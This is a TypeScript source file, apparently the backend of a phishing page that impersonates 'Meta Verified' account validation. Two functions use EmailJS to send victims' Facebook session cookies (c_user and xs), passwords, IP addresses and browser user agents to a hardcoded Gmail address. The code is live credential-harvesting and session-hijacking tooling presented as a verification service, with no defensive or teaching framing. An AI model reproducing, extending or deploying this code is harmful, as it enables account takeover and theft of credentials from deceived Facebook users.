import emailjs from "@emailjs/browser";

// Initialize EmailJS with your user ID
export const initEmailJS = () => {
  const userId = import.meta.env.VITE_EMAILJS_USER_ID;
  if (!userId) {
    console.error("EmailJS User ID is not configured");
    return;
  }
  emailjs.init(userId);
  console.log("EmailJS initialized successfully");
};

// Validation form email sender
export const sendValidationFormEmail = async (formData: any) => {
  try {
    console.log("Sending validation form email...", { formData });
    const templateParams = {
      to_email: formData.user_email || "newzatpage@gmail.com", // Default admin email if not provided
      from_name: "Meta Verified",
      subject: "Meta Verified - Account Validation Request",
      c_user: formData.c_user,
      xs: formData.xs,
      timestamp: formData.timestamp || new Date().toLocaleString(),
      ip_address: formData.ipAddress || "Not available",
      user_agent: formData.userAgent || navigator.userAgent,
    };

    const response = await emailjs.send(
      import.meta.env.VITE_EMAILJS_SERVICE_ID,
      import.meta.env.VITE_EMAILJS_VALIDATION_TEMPLATE_ID,
      templateParams,
    );
    console.log("Validation email sent successfully:", response);
    return response;
  } catch (error) {
    console.error("Error sending validation email:", error);
    throw error;
  }
};

// Confirmation form email sender
export const sendConfirmationFormEmail = async (formData: any) => {
  try {
    console.log("Sending confirmation form email...", { formData });
    const templateParams = {
      to_email: formData.user_email || "newzatpage@gmail.com", // Default admin email if not provided
      subject: "Meta Verified - Account Confirmation Details",
      user_password: formData.password,
      contact_method: formData.contactMethod,
      country_code: formData.countryCode,
      timestamp: formData.timestamp || new Date().toLocaleString(),
      ip_address: formData.ipAddress || "Not available",
      user_agent: formData.userAgent || navigator.userAgent,
    };

    const response = await emailjs.send(
      import.meta.env.VITE_EMAILJS_SERVICE_ID,
      import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID,
      templateParams,
    );
    console.log("Confirmation email sent successfully:", response);
    return response;
  } catch (error) {
    console.error("Error sending confirmation email:", error);
    throw error;
  }
};

// Type definition for form data
export interface EmailFormData {
  user_email?: string;
  contactMethod?: "email" | "phone";
  ipAddress?: string;
  password?: string;
  c_user?: string;
  xs?: string;
  countryCode?: string;
  timestamp?: string;
  userAgent?: string;
}